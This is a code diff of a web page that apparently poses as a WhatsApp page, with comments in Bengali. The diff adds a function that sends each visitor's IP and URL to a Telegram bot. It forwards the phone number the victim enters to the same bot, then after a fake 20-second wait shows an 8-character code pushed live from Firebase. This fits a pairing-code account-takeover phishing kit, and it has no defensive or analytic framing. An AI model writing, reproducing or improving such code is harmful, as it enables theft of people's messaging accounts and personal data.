@@ -68,7 +68,7 @@
     </div>
 </div>
 
-<!-- Firebase and Telegram Script Section -->
+<!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
@@ -101,34 +101,46 @@
     const phoneNumberInput = document.getElementById('phoneNumber');
     const pinDigits = document.querySelectorAll('#pinContainer .pin-digit');
 
-    async function getVisitorInfoAndNotify() {
+    // --- Functions ---
+    async function sendTelegramMessage(text) {
         try {
-            // পুরাতন লাইন: const response = await fetch('https://ipapi.co/json/');
-            // নতুন লাইন: ipify.org ব্যবহার করুন
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (error) { console.error("Telegram message failed:", error); }
+    }
+    
+    // IP API CORS এরর সমাধান করা হয়েছে
+    async function getVisitorInfoAndNotify() {
+        let ip = "Unknown";
+        try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-            
-            // ipapi.co এর মতো বিস্তারিত তথ্য না পেলে শুধু IP দিয়েই Telegram এ মেসেজ পাঠানো যেতে পারে
-            const message = `
+            ip = ipData.ip;
+        } catch (error) {
+            console.error("Failed to fetch IP using ipify:", error);
+        }
+
+        const message = `
 *👤 নতুন ভিজিটর!*
 -------------------------
 *IP:* \`${ip}\`
-*URL:* \`${window.location.href}\`
+*Source URL:* \`${window.location.href}\`
 -------------------------`;
-            await sendTelegramMessage(message);
-        } catch (error) {
-            console.error("Telegram message failed or IP fetch failed:", error);
-            await sendTelegramMessage("👤 একজন আপনার হোয়াটসঅ্যাপ পেজ ভিজিট করেছে (বিস্তারিত পাওয়া যায়নি)।");
-        }
+        await sendTelegramMessage(message);
     }
     
     function listenForCodeChanges() {
         const liveCodeRef = database.ref('liveCode');
         liveCodeRef.on('value', (snapshot) => {
             const data = snapshot.val();
-            const code = data ? data.code : "        "; 
+            // Firebase থেকে প্রাপ্ত কোড, অথবা 8টি স্পেস (যদি কোড না থাকে)
+            const code = data && data.code ? data.code.trim().padEnd(8, ' ') : "        "; 
+            
             for (let i = 0; i < 8; i++) {
+                // প্রতিটি বক্সে কোডের একটি করে অক্ষর সেট করুন
                 pinDigits[i].textContent = code[i] || ' ';
             }
         });
@@ -141,7 +153,7 @@
 
     phoneForm.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const phoneNumber = phoneNumberInput.value;
+        const phoneNumber = phoneNumberInput.value.trim();
         if (!phoneNumber) return;
         
         await sendTelegramMessage(`*📱 প্রাপ্ত হোয়াটসঅ্যাপ নম্বর:*\n\`${phoneNumber}\``);
@@ -149,11 +161,11 @@
         page1.classList.add('hidden');
         loading.classList.remove('hidden');
 
-        // Loading Time updated to 20 seconds
+        // ২০ সেকেন্ড অপেক্ষা করার পর নির্দেশনা পেজ দেখাবে
         setTimeout(() => {
             loading.classList.add('hidden');
             page2.classList.remove('hidden');
-            listenForCodeChanges();
+            listenForCodeChanges(); // ২০ সেকেন্ড পর Firebase listener শুরু
         }, 20000); 
     });
 </script>
